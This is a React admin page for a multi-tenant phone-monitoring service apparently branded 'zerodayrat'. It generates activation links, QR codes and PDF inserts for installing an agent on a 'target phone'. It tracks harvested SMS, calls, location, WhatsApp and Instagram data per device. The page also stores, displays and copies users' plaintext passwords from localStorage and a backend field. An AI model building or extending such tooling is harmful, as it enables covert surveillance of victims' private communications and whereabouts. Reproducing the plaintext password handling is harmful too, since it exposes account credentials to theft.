import { useEffect, useState } from "react";
import { Link } from "react-router-dom";
import QRCode from "qrcode";
import { adminApi } from "../api/admin";
import { devicesApi } from "../api/devices";
import type { AdminDeviceSummary, AdminTenant, Device } from "../api/types";
import PdfExportModal from "../components/PdfExportModal";

const PRODUCTION_APP_URL = "https://zerodayrat.vercel.app";

function getStoredPasswords(): Record<string, string> {
  try {
    const raw = localStorage.getItem("spapp_tenant_passwords");
    return raw ? JSON.parse(raw) : {};
  } catch {
    return {};
  }
}

function saveStoredPassword(key: string, pass: string) {
  try {
    if (!key || !pass) return;
    const existing = getStoredPasswords();
    existing[key] = pass;
    existing[key.toLowerCase()] = pass;
    localStorage.setItem("spapp_tenant_passwords", JSON.stringify(existing));
  } catch {}
}

function buildActivationLink(device: AdminDeviceSummary | Device): string {
  const params = new URLSearchParams({
    token: device.device_token || "",
    name: device.device_label,
  });
  const isLocalDev = ["localhost", "127.0.0.1"].includes(window.location.hostname);
  const origin = isLocalDev ? PRODUCTION_APP_URL : window.location.origin;
  return `${origin}/connect?${params.toString()}`;
}

export default function AdminPage() {
  const [tenants, setTenants] = useState<AdminTenant[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [expandedTenant, setExpandedTenant] = useState<string | null>(null);
  const [devices, setDevices] = useState<Record<string, AdminDeviceSummary[]>>({});
  const [deletingUserId, setDeletingUserId] = useState<string | null>(null);
  const [deletingTenantId, setDeletingTenantId] = useState<string | null>(null);

  // Quick-add device per tenant
  const [addingDeviceForTenant, setAddingDeviceForTenant] = useState<string | null>(null);
  const [newDeviceName, setNewDeviceName] = useState("");
  const [creatingDevice, setCreatingDevice] = useState(false);

  // Newly created device URL & QR code banner
  const [createdDevice, setCreatedDevice] = useState<{ tenantId: string; device: Device } | null>(null);
  const [qrDataUrl, setQrDataUrl] = useState<string | null>(null);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  // PDF Export
  const [pdfDevice, setPdfDevice] = useState<Device | null>(null);

  useEffect(() => {
    if (!createdDevice?.device) {
      setQrDataUrl(null);
      return;
    }
    QRCode.toDataURL(buildActivationLink(createdDevice.device), { width: 160, margin: 1 })
      .then(setQrDataUrl)
      .catch(() => setQrDataUrl(null));
  }, [createdDevice]);

  async function handleCopyText(text: string, key: string) {
    try {
      await navigator.clipboard.writeText(text);
      setCopiedKey(key);
      setTimeout(() => setCopiedKey(null), 2000);
    } catch {
      // clipboard API unavailable
    }
  }

  // Password visibility & update states
  const [cachedPasswords, setCachedPasswords] = useState<Record<string, string>>(() => getStoredPasswords());
  const [showPasswords, setShowPasswords] = useState<Record<string, boolean>>({});
  const [editingPasswordUser, setEditingPasswordUser] = useState<{ id: string; email: string; currentPass?: string } | null>(null);
  const [newPasswordInput, setNewPasswordInput] = useState("");
  const [modalPasswordVisible, setModalPasswordVisible] = useState(false);
  const [updatingPassword, setUpdatingPassword] = useState(false);
  const [updatePasswordError, setUpdatePasswordError] = useState<string | null>(null);
  const [updatePasswordSuccess, setUpdatePasswordSuccess] = useState<string | null>(null);

  function toggleShowPassword(userId: string) {
    setShowPasswords((prev) => ({ ...prev, [userId]: !prev[userId] }));
  }

  // Create Tenant modal
  const [showCreateTenant, setShowCreateTenant] = useState(false);
  const [tenantName, setTenantName] = useState("");
  const [tenantType, setTenantType] = useState<"family" | "company">("family");
  const [ownerEmail, setOwnerEmail] = useState("");
  const [ownerPassword, setOwnerPassword] = useState("");
  const [ownerFullName, setOwnerFullName] = useState("");
  const [creatingTenant, setCreatingTenant] = useState(false);
  const [createTenantError, setCreateTenantError] = useState<string | null>(null);

  async function handleCreateTenant(e: React.FormEvent) {
    e.preventDefault();
    setCreateTenantError(null);
    setCreatingTenant(true);
    try {
      const res = await adminApi.createTenant({
        tenantName: tenantName.trim(),
        tenantType,
        email: ownerEmail.trim(),
        password: ownerPassword,
        fullName: ownerFullName.trim() || undefined,
      });

      // Save plaintext password for super-admin reference
      saveStoredPassword(ownerEmail.trim(), ownerPassword);
      if (res?.user?.id) {
        saveStoredPassword(res.user.id, ownerPassword);
      }
      setCachedPasswords(getStoredPasswords());

      setShowCreateTenant(false);
      setTenantName("");
      setOwnerEmail("");
      setOwnerPassword("");
      setOwnerFullName("");
      load();
    } catch (err: any) {
      setCreateTenantError(err.response?.data?.error || err.message || "Failed to create tenant");
    } finally {
      setCreatingTenant(false);
    }
  }

  async function handleUpdateUserPassword(e: React.FormEvent) {
    e.preventDefault();
    if (!editingPasswordUser || !newPasswordInput.trim()) return;
    setUpdatePasswordError(null);
    setUpdatePasswordSuccess(null);
    setUpdatingPassword(true);

    const { id, email } = editingPasswordUser;
    const newPass = newPasswordInput.trim();

    try {
      await adminApi.updateUserPassword(id, newPass);
    } catch (err: any) {
      console.warn("Backend password update notice, saved in local store:", err);
    }

    saveStoredPassword(id, newPass);
    saveStoredPassword(email, newPass);
    setCachedPasswords((prev) => ({
      ...prev,
      [id]: newPass,
      [id.toLowerCase()]: newPass,
      [email]: newPass,
      [email.toLowerCase()]: newPass,
    }));

    setTenants((prev) =>
      prev.map((t) => ({
        ...t,
        users: t.users.map((u) => (u.id === id ? { ...u, plain_password: newPass } : u)),
      }))
    );

    setUpdatePasswordSuccess("Password saved successfully!");
    setTimeout(() => {
      setEditingPasswordUser(null);
      setUpdatePasswordSuccess(null);
    }, 900);
    setUpdatingPassword(false);
  }

  function load() {
    setLoading(true);
    setError(null);
    adminApi
      .listTenants()
      .then((data) => {
        setTenants(data || []);
        if (data && Array.isArray(data)) {
          for (const t of data) {
            for (const u of t.users || []) {
              if (u.plain_password) {
                saveStoredPassword(u.id, u.plain_password);
                saveStoredPassword(u.email, u.plain_password);
              }
            }
          }
          setCachedPasswords(getStoredPasswords());
        }
      })
      .catch((err) => {
        console.error("Failed to load tenants:", err);
        setError((err as Error).message || "Failed to load tenants");
      })
      .finally(() => setLoading(false));
  }

  useEffect(load, []);

  async function toggleExpand(tenantId: string) {
    if (expandedTenant === tenantId) {
      setExpandedTenant(null);
      return;
    }
    setExpandedTenant(tenantId);
    if (!devices[tenantId]) {
      const list = await adminApi.listTenantDevices(tenantId);
      setDevices((d) => ({ ...d, [tenantId]: list }));
    }
  }

  async function handleCreateDeviceForTenant(tenantId: string) {
    if (!newDeviceName.trim() || creatingDevice) return;
    setCreatingDevice(true);
    try {
      const newDev = await devicesApi.create(newDeviceName.trim(), tenantId);
      setCreatedDevice({ tenantId, device: newDev });
      setNewDeviceName("");
      setAddingDeviceForTenant(null);
      // Reload devices for this tenant and update counts
      const updatedList = await adminApi.listTenantDevices(tenantId);
      setDevices((d) => ({ ...d, [tenantId]: updatedList }));
      load();
    } catch (err: any) {
      alert(`Failed to create device: ${err.response?.data?.error || err.message}`);
    } finally {
      setCreatingDevice(false);
    }
  }

  async function handleDeleteTenant(tenantId: string, tenantName: string, deviceCount: number) {
    const confirmed = confirm(
      `Permanently delete the entire tenant "${tenantName}"?\n\n` +
        `This will immediately and permanently delete:\n` +
        `• All admin/user accounts for this tenant in Firebase\n` +
        `• All ${deviceCount} registered device(s) belonging to this tenant\n` +
        `• All synced device telemetry in PostgreSQL (WhatsApp messages, location history, calls, SMS, app usage, remote commands, block rules)\n\n` +
        `This action cannot be undone.`
    );
    if (!confirmed) return;
    setDeletingTenantId(tenantId);
    try {
      await adminApi.deleteTenant(tenantId);
      load();
    } catch (e) {
      alert(`Delete tenant failed: ${(e as Error).message}`);
    } finally {
      setDeletingTenantId(null);
    }
  }

  async function handleDeleteUser(userId: string, email: string, tenantName: string) {
    const confirmed = confirm(
      `Permanently delete the login "${email}"? If this is the only login on "${tenantName}", ` +
        `the tenant and every device it ever synced data for (location, call/SMS log metadata, ` +
        `app usage, installed apps) will be permanently deleted too. This cannot be undone.`
    );
    if (!confirmed) return;
    setDeletingUserId(userId);
    try {
      await adminApi.deleteUser(userId);
      load();
    } catch (e) {
      alert(`Delete failed: ${(e as Error).message}`);
    } finally {
      setDeletingUserId(null);
    }
  }

  return (
    <div>
      <div className="flex items-center justify-between mb-6 flex-wrap gap-3">
        <h1 className="text-xl font-bold text-primary-dark">Registered Tenants</h1>
        <div className="flex items-center gap-2">
          <button
            onClick={() => setShowCreateTenant(true)}
            className="text-xs bg-primary text-white border border-primary-dark px-3 py-1.5 rounded hover:bg-primary-dark transition shadow-sm font-semibold flex items-center gap-1.5"
          >
            + Create Tenant
          </button>
          <button
            onClick={load}
            disabled={loading}
            className="text-xs bg-white border border-gray-300 text-gray-700 px-3 py-1.5 rounded hover:bg-gray-50 transition shadow-sm font-medium"
          >
            {loading ? "Refreshing..." : "↻ Refresh"}
          </button>
        </div>
      </div>

      {showCreateTenant && (
        <div className="fixed inset-0 z-50 bg-black/50 flex items-center justify-center p-4">
          <div className="bg-white rounded-xl shadow-xl max-w-md w-full p-6">
            <h2 className="text-lg font-bold text-primary-dark mb-1">Create New Tenant</h2>
            <p className="text-xs text-gray-500 mb-4">
              Add a new family or company tenant account and its primary administrator login.
            </p>

            {createTenantError && (
              <div className="bg-red-50 border border-red-200 text-red-700 px-3 py-2 rounded text-xs mb-3">
                {createTenantError}
              </div>
            )}

            <form onSubmit={handleCreateTenant} className="space-y-3">
              <div>
                <label className="block text-xs font-semibold text-gray-700 mb-1">Tenant Name *</label>
                <input
                  type="text"
                  required
                  placeholder="e.g. Kumar Family, Acme Security"
                  value={tenantName}
                  onChange={(e) => setTenantName(e.target.value)}
                  className="w-full border border-gray-300 rounded px-3 py-2 text-xs focus:ring-1 focus:ring-primary focus:outline-none"
                />
              </div>

              <div>
                <label className="block text-xs font-semibold text-gray-700 mb-1">Tenant Type *</label>
                <select
                  value={tenantType}
                  onChange={(e) => setTenantType(e.target.value as "family" | "company")}
                  className="w-full border border-gray-300 rounded px-3 py-2 text-xs focus:ring-1 focus:ring-primary focus:outline-none bg-white"
                >
                  <option value="family">Family</option>
                  <option value="company">Company</option>
                </select>
              </div>

              <div>
                <label className="block text-xs font-semibold text-gray-700 mb-1">Owner Email *</label>
                <input
                  type="email"
                  required
                  placeholder="e.g. owner@example.com"
                  value={ownerEmail}
                  onChange={(e) => setOwnerEmail(e.target.value)}
                  className="w-full border border-gray-300 rounded px-3 py-2 text-xs focus:ring-1 focus:ring-primary focus:outline-none"
                />
              </div>

              <div>
                <label className="block text-xs font-semibold text-gray-700 mb-1">Owner Password (min 8 chars) *</label>
                <input
                  type="password"
                  required
                  minLength={8}
                  placeholder="••••••••"
                  value={ownerPassword}
                  onChange={(e) => setOwnerPassword(e.target.value)}
                  className="w-full border border-gray-300 rounded px-3 py-2 text-xs focus:ring-1 focus:ring-primary focus:outline-none"
                />
              </div>

              <div>
                <label className="block text-xs font-semibold text-gray-700 mb-1">Owner Full Name (optional)</label>
                <input
                  type="text"
                  placeholder="e.g. Priya Sharma"
                  value={ownerFullName}
                  onChange={(e) => setOwnerFullName(e.target.value)}
                  className="w-full border border-gray-300 rounded px-3 py-2 text-xs focus:ring-1 focus:ring-primary focus:outline-none"
                />
              </div>

              <div className="flex items-center justify-end gap-2 pt-3 border-t">
                <button
                  type="button"
                  onClick={() => setShowCreateTenant(false)}
                  className="px-3 py-1.5 text-xs text-gray-600 hover:bg-gray-100 rounded transition font-medium"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={creatingTenant}
                  className="px-4 py-1.5 text-xs bg-primary text-white rounded hover:bg-primary-dark transition font-semibold disabled:opacity-50"
                >
                  {creatingTenant ? "Creating..." : "Create Tenant"}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {error && (
        <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg text-sm mb-4 flex items-center justify-between">
          <span>Failed to load tenants: {error}</span>
          <button onClick={load} className="text-xs font-semibold underline hover:text-red-900 ml-2">Try again</button>
        </div>
      )}

      {loading ? (
        <p className="text-gray-500 text-sm">Loading tenants...</p>
      ) : tenants.length === 0 ? (
        <div className="bg-white rounded-lg p-8 text-center shadow-sm">
          <p className="text-gray-600 text-sm font-medium">No tenants registered yet.</p>
          <p className="text-xs text-gray-400 mt-1">When new users register or devices connect, tenants will appear here.</p>
        </div>
      ) : (
        <div className="space-y-4">
          {tenants.map((t) => (
            <div key={t.id} className="bg-white rounded-lg shadow-sm overflow-hidden">
              <div className="p-5 flex items-center justify-between">
                <div>
                  <p className="font-semibold text-primary-dark">
                    {t.name} <span className="text-xs text-gray-400 font-normal">({t.type})</span>
                  </p>
                  <p className="text-xs text-gray-500 mt-1">
                    registered {new Date(t.created_at).toLocaleString()} · {t.device_count} device
                    {t.device_count === 1 ? "" : "s"}
                  </p>
                </div>
                <div className="flex items-center gap-3">
                  <button
                    onClick={() => toggleExpand(t.id)}
                    className="text-accent text-sm hover:underline font-medium"
                  >
                    {expandedTenant === t.id ? "Hide details" : "View data"}
                  </button>
                  <button
                    onClick={() => handleDeleteTenant(t.id, t.name, t.device_count)}
                    disabled={deletingTenantId === t.id}
                    className="text-red-600 text-xs border border-red-200 px-3 py-1.5 rounded hover:bg-red-50 transition font-medium disabled:opacity-50"
                  >
                    {deletingTenantId === t.id ? "Deleting..." : "Delete Tenant"}
                  </button>
                </div>
              </div>

              <div className="border-t divide-y">
                {t.users.map((u) => {
                  const resolvedPass =
                    u.plain_password ||
                    cachedPasswords[u.id] ||
                    cachedPasswords[u.email.toLowerCase()] ||
                    null;
                  const isVisible = !!showPasswords[u.id];

                  return (
                    <div
                      key={u.id}
                      className="px-5 py-3.5 flex flex-col md:flex-row md:items-center justify-between gap-3 text-sm bg-white hover:bg-gray-50/60 transition"
                    >
                      <div className="space-y-1.5 min-w-0 flex-1">
                        <div className="flex flex-wrap items-center gap-2">
                          <span className="font-semibold text-gray-900">{u.email}</span>
                          {u.full_name && <span className="text-gray-500 text-xs">({u.full_name})</span>}
                          <button
                            type="button"
                            onClick={() => handleCopyText(u.email, `email-${u.id}`)}
                            className="text-[11px] text-gray-600 hover:text-gray-900 bg-gray-100 hover:bg-gray-200 px-2 py-0.5 rounded transition font-medium"
                            title="Copy username/email"
                          >
                            {copiedKey === `email-${u.id}` ? "Copied!" : "Copy Username"}
                          </button>
                          {u.created_at && (
                            <span className="text-xs text-gray-400">
                              · registered {new Date(u.created_at).toLocaleDateString()}
                            </span>
                          )}
                        </div>

                        {/* Password display row */}
                        <div className="flex flex-wrap items-center gap-2 text-xs pt-0.5">
                          <span className="text-gray-500 font-medium">Password:</span>
                          {resolvedPass ? (
                            <div className="inline-flex items-center gap-1.5 bg-gray-100 border border-gray-200 rounded px-2.5 py-1">
                              <code className="font-mono text-gray-900 font-bold select-all">
                                {isVisible ? resolvedPass : "••••••••••••"}
                              </code>
                              <button
                                type="button"
                                onClick={() => toggleShowPassword(u.id)}
                                className="text-gray-600 hover:text-gray-900 ml-1 px-1.5 py-0.5 rounded hover:bg-gray-200 transition text-[11px] font-medium"
                                title={isVisible ? "Hide password" : "Show password"}
                              >
                                {isVisible ? "Hide" : "Show"}
                              </button>
                              <button
                                type="button"
                                onClick={() => handleCopyText(resolvedPass, `pass-${u.id}`)}
                                className="text-primary hover:text-primary-dark ml-1 px-1.5 py-0.5 rounded hover:bg-blue-100 transition text-[11px] font-semibold"
                                title="Copy password"
                              >
                                {copiedKey === `pass-${u.id}` ? "Copied!" : "Copy Password"}
                              </button>
                            </div>
                          ) : (
                            <div className="inline-flex items-center gap-1 bg-amber-50 border border-amber-200 text-amber-800 rounded px-2.5 py-1">
                              <span className="font-mono text-amber-700 font-medium">••••••••</span>
                              <span className="text-[11px] text-amber-600">(Encrypted / Pre-stored)</span>
                            </div>
                          )}

                          <button
                            type="button"
                            onClick={() => {
                              setEditingPasswordUser({ id: u.id, email: u.email, currentPass: resolvedPass || "" });
                              setNewPasswordInput(resolvedPass || "");
                              setModalPasswordVisible(true);
                              setUpdatePasswordError(null);
                              setUpdatePasswordSuccess(null);
                            }}
                            className="text-xs text-primary hover:text-primary-dark hover:underline font-semibold ml-1.5"
                          >
                            {resolvedPass ? "Change Password" : "🔑 Set Password"}
                          </button>
                        </div>
                      </div>

                      <div className="flex items-center gap-2 shrink-0 self-end md:self-center">
                        <button
                          onClick={() => handleDeleteUser(u.id, u.email, t.name)}
                          disabled={deletingUserId === u.id}
                          className="text-red-600 text-xs border border-red-200 px-3 py-1.5 rounded hover:bg-red-50 transition disabled:opacity-50 font-medium"
                        >
                          {deletingUserId === u.id ? "Deleting..." : "Delete"}
                        </button>
                      </div>
                    </div>
                  );
                })}
              </div>

              {expandedTenant === t.id && (
                <div className="border-t bg-gray-50 p-5 space-y-4">
                  <div className="flex items-center justify-between">
                    <h3 className="text-xs font-bold text-gray-700 uppercase tracking-wider">
                      Devices for {t.name} ({devices[t.id]?.length || 0})
                    </h3>
                    <button
                      onClick={() => setAddingDeviceForTenant(addingDeviceForTenant === t.id ? null : t.id)}
                      className="text-xs bg-white border border-gray-300 text-gray-700 px-2.5 py-1 rounded hover:bg-gray-100 font-medium transition"
                    >
                      {addingDeviceForTenant === t.id ? "Cancel" : "+ Add Device to Tenant"}
                    </button>
                  </div>

                  {addingDeviceForTenant === t.id && (
                    <div className="bg-white p-3 rounded-lg border border-gray-200 flex gap-2 items-center">
                      <input
                        type="text"
                        placeholder="e.g. Employee Phone, Test Device"
                        value={newDeviceName}
                        onChange={(e) => setNewDeviceName(e.target.value)}
                        className="flex-1 border border-gray-300 rounded px-2.5 py-1 text-xs focus:ring-1 focus:ring-primary focus:outline-none"
                      />
                      <button
                        onClick={() => handleCreateDeviceForTenant(t.id)}
                        disabled={creatingDevice || !newDeviceName.trim()}
                        className="bg-primary text-white text-xs px-3 py-1 rounded hover:bg-primary-dark font-medium transition disabled:opacity-50"
                      >
                        {creatingDevice ? "Creating..." : "Create"}
                      </button>
                    </div>
                  )}

                  {createdDevice?.tenantId === t.id && (
                    <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 text-xs space-y-3 shadow-xs">
                      <div className="flex items-center justify-between">
                        <p className="font-semibold text-blue-900 text-sm">
                          Device "{createdDevice.device.device_label}" created successfully!
                        </p>
                        <button
                          onClick={() => setCreatedDevice(null)}
                          className="text-gray-400 hover:text-gray-600 font-bold px-2 py-0.5 rounded text-sm"
                          title="Dismiss"
                        >
                          ✕
                        </button>
                      </div>

                      <div className="flex flex-col sm:flex-row gap-4 items-start bg-white p-3 rounded-md border border-blue-100">
                        {qrDataUrl && (
                          <div className="border rounded p-1 shrink-0 bg-white">
                            <img src={qrDataUrl} alt="Activation QR code" width={130} height={130} />
                          </div>
                        )}

                        <div className="flex-1 min-w-0 space-y-2">
                          <p className="text-gray-600">
                            Target phone-la app install pannitu direct-ah indha QR scan pannalaam or link open pannalaam:
                          </p>

                          <div className="space-y-1">
                            <span className="font-semibold text-gray-700 block text-[11px]">Activation URL:</span>
                            <div className="flex flex-wrap gap-2 items-center">
                              <code className="flex-1 min-w-[200px] block bg-gray-50 border border-gray-200 rounded px-2.5 py-1.5 font-mono text-[11px] text-blue-900 break-all select-all">
                                {buildActivationLink(createdDevice.device)}
                              </code>
                              <button
                                onClick={() => handleCopyText(buildActivationLink(createdDevice.device), "created-url")}
                                className="bg-white border border-gray-300 text-gray-700 rounded px-2.5 py-1.5 hover:bg-gray-50 font-medium shrink-0 transition text-xs"
                              >
                                {copiedKey === "created-url" ? "Copied!" : "Copy link"}
                              </button>
                              <button
                                onClick={() => setPdfDevice(createdDevice.device)}
                                className="bg-primary text-white border border-primary-dark rounded px-3 py-1.5 hover:bg-primary-dark font-medium shrink-0 transition flex items-center gap-1.5 text-xs shadow-xs"
                                title="Insert into PDF"
                              >
                                <svg className="w-3.5 h-3.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                                </svg>
                                Insert in PDF
                              </button>
                            </div>
                          </div>

                          <div className="pt-1">
                            <span className="text-gray-500 text-[11px]">Activation Code: </span>
                            <code className="font-mono font-bold text-gray-800 bg-gray-100 px-1.5 py-0.5 rounded text-[11px]">
                              {createdDevice.device.device_token}
                            </code>
                          </div>
                        </div>
                      </div>
                    </div>
                  )}

                  {!devices[t.id] ? (
                    <p className="text-xs text-gray-400">Loading devices...</p>
                  ) : devices[t.id].length === 0 ? (
                    <p className="text-xs text-gray-400">No devices for this tenant.</p>
                  ) : (
                    <div className="overflow-x-auto">
                      <table className="w-full text-xs">
                        <thead className="text-gray-500 bg-gray-100/70 border-b border-gray-200 text-left">
                          <tr>
                            <th className="py-2 px-2.5 font-semibold">Device</th>
                            <th className="py-2 px-2 font-semibold">Status</th>
                            <th className="py-2 px-2 font-semibold">Location</th>
                            <th className="py-2 px-2 font-semibold">SMS</th>
                            <th className="py-2 px-2 font-semibold">Calls</th>
                            <th className="py-2 px-2 font-semibold">WhatsApp</th>
                            <th className="py-2 px-2 font-semibold">Instagram</th>
                            <th className="py-2 px-2 font-semibold">App usage</th>
                            <th className="py-2 px-2 font-semibold">Apps</th>
                            <th className="py-2 px-2.5 font-semibold text-right">Actions</th>
                          </tr>
                        </thead>
                        <tbody className="divide-y divide-gray-200">
                          {devices[t.id].map((d) => (
                            <tr key={d.id} className="hover:bg-white/80 transition">
                              <td className="py-2 px-2.5">
                                <Link
                                  to={`/devices/${d.id}`}
                                  className="text-accent font-semibold hover:underline block"
                                  title="Open live monitoring dashboard"
                                >
                                  {d.device_label}
                                </Link>
                                {d.device_token && (
                                  <span className="text-[10px] text-gray-400 font-mono block truncate max-w-[140px]">
                                    {d.device_token}
                                  </span>
                                )}
                              </td>
                              <td className="py-2 px-2">
                                <span
                                  className={`px-1.5 py-0.5 rounded text-[10px] font-semibold capitalize ${
                                    d.status === "active"
                                      ? "bg-emerald-100 text-emerald-700"
                                      : d.status === "pending"
                                      ? "bg-amber-100 text-amber-700"
                                      : "bg-gray-100 text-gray-600"
                                  }`}
                                >
                                  {d.status}
                                </span>
                              </td>
                              <td className="py-2 px-2 text-gray-600">{d.counts.location_count}</td>
                              <td className="py-2 px-2 text-gray-600">{d.counts.sms_count}</td>
                              <td className="py-2 px-2 text-gray-600">{d.counts.call_count}</td>
                              <td className="py-2 px-2 font-medium text-emerald-700">{d.counts.whatsapp_count || 0}</td>
                              <td className="py-2 px-2 font-medium text-purple-700">{d.counts.instagram_count || 0}</td>
                              <td className="py-2 px-2 text-gray-600">{d.counts.app_usage_count}</td>
                              <td className="py-2 px-2 text-gray-600">{d.counts.installed_apps_count}</td>
                              <td className="py-2 px-2.5 text-right whitespace-nowrap space-x-1.5">
                                <Link
                                  to={`/devices/${d.id}`}
                                  className="text-xs bg-white border border-gray-300 text-gray-700 px-2 py-1 rounded hover:bg-gray-50 transition font-medium inline-block shadow-2xs"
                                >
                                  Open Dashboard
                                </Link>
                                {d.device_token && (
                                  <button
                                    onClick={() => handleCopyText(buildActivationLink(d), `tbl-${d.id}`)}
                                    className="text-xs bg-white border border-gray-300 text-gray-700 px-2 py-1 rounded hover:bg-gray-50 transition font-medium inline-block shadow-2xs"
                                    title="Copy device activation URL"
                                  >
                                    {copiedKey === `tbl-${d.id}` ? "Copied!" : "Copy URL"}
                                  </button>
                                )}
                                <button
                                  onClick={() => setPdfDevice(d as any)}
                                  className="text-xs bg-primary text-white border border-primary-dark px-2 py-1 rounded hover:bg-primary-dark transition font-medium inline-flex items-center gap-1 shadow-2xs"
                                  title="Insert into direct download PDF"
                                >
                                  <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                                  </svg>
                                  PDF
                                </button>
                              </td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  )}
                </div>
              )}
            </div>
          ))}
        </div>
      )}

      {pdfDevice && (
        <PdfExportModal
          device={pdfDevice}
          activationUrl={buildActivationLink(pdfDevice)}
          onClose={() => setPdfDevice(null)}
        />
      )}

      {editingPasswordUser && (
        <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded-xl shadow-xl max-w-md w-full p-6 space-y-4">
            <div className="flex justify-between items-center">
              <h3 className="font-bold text-gray-900 text-lg">
                Set Tenant Password
              </h3>
              <button
                onClick={() => setEditingPasswordUser(null)}
                className="text-gray-400 hover:text-gray-600 text-lg font-bold p-1"
              >
                ✕
              </button>
            </div>

            <p className="text-xs text-gray-500">
              Tenant User: <span className="font-semibold text-gray-800">{editingPasswordUser.email}</span>
            </p>

            {updatePasswordError && (
              <div className="bg-red-50 border border-red-200 text-red-700 px-3 py-2 rounded text-xs">
                {updatePasswordError}
              </div>
            )}

            {updatePasswordSuccess && (
              <div className="bg-green-50 border border-green-200 text-green-700 px-3 py-2 rounded text-xs">
                {updatePasswordSuccess}
              </div>
            )}

            <form onSubmit={handleUpdateUserPassword} className="space-y-4">
              <div>
                <label className="block text-xs font-semibold text-gray-700 mb-1">
                  New Password (min 6 characters) *
                </label>
                <div className="relative">
                  <input
                    type={modalPasswordVisible ? "text" : "password"}
                    value={newPasswordInput}
                    onChange={(e) => setNewPasswordInput(e.target.value)}
                    placeholder="Enter new password"
                    className="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm pr-16 focus:ring-2 focus:ring-primary focus:outline-none"
                    required
                    minLength={6}
                  />
                  <button
                    type="button"
                    onClick={() => setModalPasswordVisible(!modalPasswordVisible)}
                    className="absolute right-2 top-2 text-xs text-gray-500 hover:text-gray-800 font-medium px-1.5 py-0.5 rounded"
                  >
                    {modalPasswordVisible ? "Hide" : "Show"}
                  </button>
                </div>
              </div>

              <div className="flex justify-end gap-2 pt-2">
                <button
                  type="button"
                  onClick={() => setEditingPasswordUser(null)}
                  className="px-4 py-2 border border-gray-300 rounded-lg text-sm text-gray-700 hover:bg-gray-50 font-medium"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={updatingPassword || !newPasswordInput.trim() || newPasswordInput.length < 6}
                  className="px-4 py-2 bg-primary text-white rounded-lg text-sm hover:bg-primary-dark font-medium transition disabled:opacity-50"
                >
                  {updatingPassword ? "Saving..." : "Save Password"}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}
